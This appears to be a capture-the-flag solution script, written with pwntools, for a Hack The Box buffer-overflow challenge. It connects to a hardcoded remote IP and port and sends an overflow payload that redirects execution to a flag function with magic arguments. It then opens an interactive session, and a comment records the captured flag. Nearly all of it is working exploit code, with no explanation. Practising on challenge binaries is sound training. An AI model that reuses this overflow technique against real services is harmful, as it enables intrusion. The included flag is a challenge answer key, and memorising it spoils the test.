from pwn import *
host, port = '142.93.35.92',31446
#p = process("./vuln")
#gdb.attach("vuln","b *0x08049296")
p = remote(host,port)
flag = 0x80491e2
exp = "A"*0xb8+p32(1)+p32(flag)+p32(1)+p32(0xdeadbeef)+p32(0xc0ded00d)
p.sendlineafter("s:",exp)

p.interactive()
# HTB{0ur_Buff3r_1s_not_healthy}
